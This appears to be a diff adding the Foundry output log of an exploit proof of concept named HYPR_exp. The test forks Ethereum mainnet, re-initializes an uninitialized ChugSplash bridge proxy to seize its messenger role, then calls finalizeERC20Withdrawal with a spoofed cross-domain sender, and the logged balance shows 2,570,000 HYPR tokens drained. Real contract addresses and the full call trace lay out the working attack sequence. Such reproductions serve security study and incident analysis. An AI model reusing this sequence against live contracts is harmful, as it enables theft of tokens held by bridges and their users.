@@ -1,0 +1,83 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/HYPR_exp.sol:ContractTest
+[PASS] testExploit() (gas: 105730)
+Logs:
+  Exploiter HYPR balance before attack: 0.000000000000000000
+  Exploiter HYPR balance after attack: 2570000.000000000000000000
+
+Traces:
+  [6519] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 18774584 [1.877e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(HYPR: [0x31aDdA225642a8f4D7e90d4152BE6661ab22a5a2], "HYPR")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ChugSplash: [0x40C31236B228935b0329eFF066B1AD96e319595e], "ChugSplash")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(messageSender: [0x4200000000000000000000000000000000000010], "messageSender")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(l2Token: [0xD7a421A6786cF4951a8FaE10385680222D63f89a], "l2Token")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [108530] ContractTest::testExploit()
+    ├─ [9786] HYPR::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [2626] HyprTokenL1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [924] HYPR::fallback() [staticcall]
+    │   ├─ [267] HyprTokenL1::decimals() [delegatecall]
+    │   │   └─ ← [Return] 18
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Exploiter HYPR balance before attack", val: 0, decimals: 18)
+    ├─ [24585] ChugSplash::initialize(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [2347] 0xba86Cd28d937F1CC7C74a365368477408578364A::isUpgrading() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ [11822] 0xE468B43b4Ae4D750Cd6a5D7EdACC1A751302c99C::initialize(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ emit Initialized(version: 2)
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0x000000000000000000000000f0e9a593d3b252511adfb5ea16ebf0a0450b2a11 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [55562] ChugSplash::finalizeERC20Withdrawal(HYPR: [0x31aDdA225642a8f4D7e90d4152BE6661ab22a5a2], l2Token: [0xD7a421A6786cF4951a8FaE10385680222D63f89a], ChugSplash: [0x40C31236B228935b0329eFF066B1AD96e319595e], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2570000000000000000000000 [2.57e24], 0x)
+    │   ├─ [347] 0xba86Cd28d937F1CC7C74a365368477408578364A::isUpgrading() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ [53781] 0xE468B43b4Ae4D750Cd6a5D7EdACC1A751302c99C::finalizeERC20Withdrawal(HYPR: [0x31aDdA225642a8f4D7e90d4152BE6661ab22a5a2], l2Token: [0xD7a421A6786cF4951a8FaE10385680222D63f89a], ChugSplash: [0x40C31236B228935b0329eFF066B1AD96e319595e], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2570000000000000000000000 [2.57e24], 0x) [delegatecall]
+    │   │   ├─ [469] ContractTest::xDomainMessageSender() [staticcall]
+    │   │   │   └─ ← [Return] messageSender: [0x4200000000000000000000000000000000000010]
+    │   │   ├─ [853] HYPR::fallback(0x01ffc9a7) [staticcall]
+    │   │   │   ├─ [195] HyprTokenL1::supportsInterface(0x01ffc9a7) [delegatecall]
+    │   │   │   │   └─ ← [Revert] unrecognized function selector 0x01ffc9a7 for contract 0x5877Bb958999eC60AdDaFa3e053F451A81dDBFE3, which has no fallback function.
+    │   │   │   └─ ← [Revert] EvmError: Revert
+    │   │   ├─ [853] HYPR::fallback(0x01ffc9a7) [staticcall]
+    │   │   │   ├─ [195] HyprTokenL1::supportsInterface(0x01ffc9a7) [delegatecall]
+    │   │   │   │   └─ ← [Revert] unrecognized function selector 0x01ffc9a7 for contract 0x5877Bb958999eC60AdDaFa3e053F451A81dDBFE3, which has no fallback function.
+    │   │   │   └─ ← [Revert] EvmError: Revert
+    │   │   ├─ [35186] HYPR::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2570000000000000000000000 [2.57e24])
+    │   │   │   ├─ [34523] HyprTokenL1::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2570000000000000000000000 [2.57e24]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: ChugSplash: [0x40C31236B228935b0329eFF066B1AD96e319595e], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2570000000000000000000000 [2.57e24])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x4928949d89e1b09a1d15df2eb33dd95d048e351bcf12fe798f83f4fb2b21793d: 0x000000000000000000000000000000000000000000022038a13314d8caf00000 → 0x000000000000000000000000000000000000000000000000a688906bd8b00000
+    │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x000000000000000000000000000000000000000000022037faaa846cf2400000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit ERC20WithdrawalFinalized(l1Token: HYPR: [0x31aDdA225642a8f4D7e90d4152BE6661ab22a5a2], l2Token: l2Token: [0xD7a421A6786cF4951a8FaE10385680222D63f89a], from: ChugSplash: [0x40C31236B228935b0329eFF066B1AD96e319595e], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 2570000000000000000000000 [2.57e24], extraData: 0x)
+    │   │   ├─ emit ERC20BridgeFinalized(localToken: HYPR: [0x31aDdA225642a8f4D7e90d4152BE6661ab22a5a2], remoteToken: l2Token: [0xD7a421A6786cF4951a8FaE10385680222D63f89a], from: ChugSplash: [0x40C31236B228935b0329eFF066B1AD96e319595e], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 2570000000000000000000000 [2.57e24], extraData: 0x)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc0801673e11c2f40cd912c69b25fbd270c4e562e5d641d8ec0838a9729e12612: 0x000000000000000000000000000000000000000000022038a13314d8caf00000 → 0x000000000000000000000000000000000000000000000000a688906bd8b00000
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [1286] HYPR::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [626] HyprTokenL1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 2570000000000000000000000 [2.57e24]
+    │   └─ ← [Return] 2570000000000000000000000 [2.57e24]
+    ├─ [924] HYPR::fallback() [staticcall]
+    │   ├─ [267] HyprTokenL1::decimals() [delegatecall]
+    │   │   └─ ← [Return] 18
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Exploiter HYPR balance after attack", val: 2570000000000000000000000 [2.57e24], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.39s (4.03s CPU time)
+
+Ran 1 test suite in 7.25s (5.39s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
